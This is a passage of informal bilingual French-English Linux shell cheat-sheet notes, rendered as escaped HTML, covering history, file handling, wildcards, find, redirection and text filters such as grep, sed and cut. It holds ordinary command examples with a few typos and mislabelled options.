&lt;/table&gt;

&lt;h3 id=&quot;history&quot;&gt;history&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history &lt;span class=&quot;c&quot;&gt;# user history&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;history&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# recent history&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# recent history&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 118 &lt;span class=&quot;c&quot;&gt;# call command&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;21 &lt;span class=&quot;c&quot;&gt;# with replacement&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;files&quot;&gt;files&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# FS: File System&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 1-regular files&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 2-directory&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 3-special files (/dev)&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;c&quot;&gt;# root directory != /root&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/mourad &lt;span class=&quot;c&quot;&gt;# home directory&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# change date&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# create  arborescence&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -r : recursive&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -i : confirmation&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -p : keep date and permissions&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; file &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# red symbolique links = ne pointe vers rien&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls size = taille fichier ordinaire seulement et non sous repertoire (du)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# remove le file -i&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file a.out &lt;span class=&quot;c&quot;&gt;# file type&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;wildcards&quot;&gt;wildcards&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;wildcards&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;action&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[abc]&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[a-z]&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[!...]&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;inverse&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[^...]&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;inverse&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;escape character&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'...'&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;escape all&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;...&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;escape all but keep variables&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;find&quot;&gt;find&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;option&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;example&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-name&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fich*&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-type&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;b,c,d,f,l,p,s&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-user&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mourad or UID&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-group&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;root or GID&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-size&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;+-100b,c,w,k,M,G&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-empty&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-size 0&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-atime&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;access time&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-mtime&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;modification time&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-ctime&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;change time&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-perm&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[+-]777&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-links&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[+-]3&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-inume&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;inode&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-[i]regex&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'.*slyunix/t-shirt.*'&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-print&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;implicite&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-ls&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;``&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-exec&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -f {} \;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-ok&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -f {} \;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-a&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-and&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-o&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-or&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;not&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;Ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;$ find . ! \( -type f -o -type d \) -ls&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whereis &lt;span class=&quot;c&quot;&gt;# cherche binaire et source, -b, -m, s&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# premiére occurence dans $PATH&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;locate &lt;span class=&quot;c&quot;&gt;# chercher fichier via BDD /var/lib/located.d via updatedb dans /etc/sysconfig/locate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;redirection&quot;&gt;redirection&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# standard output&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /home/ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; home_content.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /home/ &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; home_content.txt
&lt;span class=&quot;c&quot;&gt;# redirections are interpreted from right to the left&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &amp;lt; text.txt &lt;span class=&quot;c&quot;&gt;# standard input&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&amp;lt;\&amp;lt;&lt;/span&gt; fin &lt;span class=&quot;c&quot;&gt;# writing to &quot;fin&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[a-z]&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[A-Z]&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&amp;lt;&lt;/span&gt;&amp;lt; fin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[a-z]&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[A-Z]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;file&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# standard output&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# input: stdin, descriptor 0 or &amp;amp;0&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# output: stdout, descriptor 1 or &amp;amp;1&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# error: stderr, descriptor 2 or &amp;amp;2&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# order: &amp;lt;,&amp;gt;,&amp;gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;3&amp;gt;dump.log &lt;span class=&quot;c&quot;&gt;# create output (3 to 9)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;3 &lt;span class=&quot;c&quot;&gt;# used&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;3&amp;gt;&amp;amp;- &lt;span class=&quot;c&quot;&gt;# closed&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;filters&quot;&gt;filters&lt;/h3&gt;
&lt;p&gt;programme which read and write and traite data of standard output: &lt;code class=&quot;highlighter-rouge&quot;&gt;wc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;more&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt;
pipeline, tubes, pipe
redirigiger canal de sortie d’une commande vers canal d’entrée d’une autre
redirect command output to input of other command&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# normal&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; res.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &amp;lt; res.txt

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# better&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;direname /tmp/a/liste &lt;span class=&quot;c&quot;&gt;# -&amp;gt; /tmp/mourad&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt; /tmp/a/liste &lt;span class=&quot;c&quot;&gt;# -&amp;gt; liste&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# grep, egrep, fgrep: select lines from file&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -v inverse&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -c return line number&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -n give the line number also&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -i case sensitive&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -l give source, in case of multipl files&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# regular expressions&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;egrep
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# fast grep&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fgrep
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# stream editor&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/__NOM__/Toto/g'&lt;/span&gt; file.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;toto&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/**&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;**/g&quot;&lt;/span&gt; file.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/^ *$/d'&lt;/span&gt; file.txt: remove empty lines

&lt;span class=&quot;c&quot;&gt;# columns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-cNUM&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c2&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c2-4&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c1&lt;/span&gt;,2,3-10

&lt;span class=&quot;c&quot;&gt;# fields&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fCHAMP&lt;/span&gt;: sélectionner champ séparé par tab
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f1&lt;/span&gt; fichier
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f1&lt;/span&gt;,3 fichier
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;: &lt;span class=&quot;nt&quot;&gt;-f1&lt;/span&gt;,3 /etc/passwd

&lt;span class=&quot;c&quot;&gt;# count lines&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; 
&lt;span class=&quot;c&quot;&gt;# -l : lines &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -c : bytes&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -w : words&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -m : characters&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# split file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ln&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; Nbkm] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fic[prefix]]
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 150m debian.iso fic
&lt;span class=&quot;c&quot;&gt;# will create ficaa, ficab,...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -b: all files have same size&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -l: ... have same lines number&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fic&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; debian.iso &lt;span class=&quot;c&quot;&gt;# reconstrution&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;option] original dist &lt;span class=&quot;c&quot;&gt;# replace character&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;liste.txt | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;oi&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ea&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# replace spaces by :&lt;/span&gt;
